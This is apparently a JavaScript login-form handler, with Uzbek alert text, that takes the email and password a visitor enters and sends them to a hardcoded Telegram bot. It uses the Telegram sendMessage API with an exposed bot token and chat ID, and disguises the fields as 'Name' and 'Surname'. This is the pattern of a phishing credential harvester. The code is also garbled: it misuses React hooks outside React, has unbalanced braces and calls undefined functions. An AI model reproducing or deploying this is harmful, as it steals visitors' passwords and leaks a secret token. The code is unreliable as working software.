const Form = document.querySelector(".form")
const Email = document.querySelector("#email")
const Password = document.querySelector("#pswd")

const SendMessage = (e) => {
    const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
    e.preventDefault()

 if (Email.value === "" || Password.value === " ") {
     alert("Malumotlarni to`liq kiriting")
 } 
 else {
        // Email.value = ""  
        // Password.value = ""

        const text = `%0A 👦 Name: ${email.value}  %0A 👦 Surname:  ${password.value} `;
        const chatId = -1002128588085;
        const token = '6834109969:AAEhUkHL4MsMs8Be2CWGY9oC7KXSbW8JHAM';
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=html`;
        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();
        setResult(true)
        fetch(url)
          .then((response) => response.json())
          .then((data) => {
            setPassword('');
            setEmail('');
            setMsg(true)
 }
}
Form.addEventListener("submit" , SendMessage)